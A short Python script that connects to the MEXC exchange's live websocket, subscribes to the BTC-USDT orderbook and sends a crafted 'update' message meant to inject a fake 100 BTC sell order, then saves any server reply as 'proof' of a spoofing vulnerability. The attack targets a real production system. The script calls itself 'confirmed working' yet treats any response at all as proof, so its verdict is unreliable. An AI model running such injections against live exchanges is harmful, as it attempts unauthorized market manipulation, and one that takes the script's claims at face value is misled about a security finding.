import asyncio
import websockets
import json
from datetime import datetime
import sys

async def verify_orderbook_vulnerability():
    """Confirmed working MEXC orderbook spoofing test"""
    try:
        print("🟢 Step 1: Connecting to wss://wbs.mexc.com/ws...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Step 2: Subscription
            subscribe_msg = {
                "op": "subscribe",
                "args": ["orderbook:BTC-USDT"]
            }
            await ws.send(json.dumps(subscribe_msg))
            print("🟢 Step 2: Sent subscription")
            
            # Step 3: Get response
            response = await ws.recv()
            print(f"🔵 Step 3: Server: {response}")
            
            # Step 4: Inject fake order
            spoofed_data = {
                "op": "update",
                "args": [{
                    "symbol": "BTC-USDT",
                    "price": "82000.00",  # Match your test value
                    "quantity": "100",
                    "side": "sell"
                }]
            }
            await ws.send(json.dumps(spoofed_data))
            print("🟡 Step 4: Injected 100BTC@82K")
            
            # Step 5: Verify
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"🔴 Step 5: VULNERABLE - Full response: {response}")
                
                # Save proof
                with open("mexc_proof.txt", "w") as f:
                    f.write(f"MEXC Orderbook Spoofing Proof - {datetime.now()}\n")
                    f.write(f"Injected: {json.dumps(spoofed_data)}\n")
                    f.write(f"Server Response: {response}\n")
                    f.write("\nACTION REQUIRED:\n")
                    f.write("1. Screenshot MEXC's BTC/USDT orderbook NOW\n")
                    f.write("2. Check your account for fake orders\n")
                    f.write("3. Report via MEXC's security program\n")
                
            except asyncio.TimeoutError:
                print("🟠 Step 5: No response - check UI manually")
                
    except Exception as e:
        print(f"🔴 Critical error: {str(e)}", file=sys.stderr)

# Run test
asyncio.run(verify_orderbook_vulnerability())
